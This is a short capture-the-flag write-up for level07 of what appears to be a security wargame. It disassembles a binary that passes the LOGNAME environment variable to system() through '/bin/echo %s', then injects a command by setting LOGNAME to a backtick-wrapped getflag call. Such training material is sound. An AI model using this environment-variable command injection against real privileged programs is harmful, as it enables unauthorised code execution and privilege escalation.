Here, we have a binary that executes, once again, as flag07.
We disassemble it in gdb, and we can see the main function is
quite short.

(in <main>)

804856f:	c7 04 24 80 86 04 08 	mov    DWORD PTR [esp],0x8048680
8048576:	e8 85 fe ff ff       	call   8048400 <getenv@plt>
804857b:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
804857f:	c7 44 24 04 88 86 04 	mov    DWORD PTR [esp+0x4],0x8048688
8048586:	08
8048587:	8d 44 24 14          	lea    eax,[esp+0x14]
804858b:	89 04 24             	mov    DWORD PTR [esp],eax
804858e:	e8 ad fe ff ff       	call   8048440 <asprintf@plt>
8048593:	8b 44 24 14          	mov    eax,DWORD PTR [esp+0x14]
8048597:	89 04 24             	mov    DWORD PTR [esp],eax
804859a:	e8 71 fe ff ff       	call   8048410 <system@plt>

(gdb)$> x/s 0x8048680

0x8048680:	 "LOGNAME"

(gdb)$> x/s 0x8048688

0x8048688:	 "/bin/echo %s "

It will use the system function to cat an environment
variable. After some tests, we can see that the said variable is
LOGNAME. The, we just have to modify it to exectute some code.
We can now get our flag directly:

$> export LOGNAME=\`getflag\`
$> ./level07

We can now get the next flag.
